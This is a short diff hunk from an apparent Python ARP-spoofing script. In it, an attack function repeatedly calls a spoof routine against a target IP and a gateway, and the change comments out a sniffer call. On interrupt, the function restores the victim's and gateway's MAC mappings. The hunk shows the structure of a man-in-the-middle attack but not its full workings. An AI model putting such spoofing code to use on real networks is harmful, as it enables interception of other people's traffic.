@@ -59,7 +59,7 @@ def attack(tgtIP, gateIP):
         try:
             spoof(tgtIP, gateIP, victimMac, gatewayMac)
             time.sleep(1.5)
-            sniffer(tgtIP, gateIP)
+            #sniffer(tgtIP, gateIP)
         except KeyboardInterrupt:
             restore(tgtIP, gateIP, victimMac, gatewayMac)
 
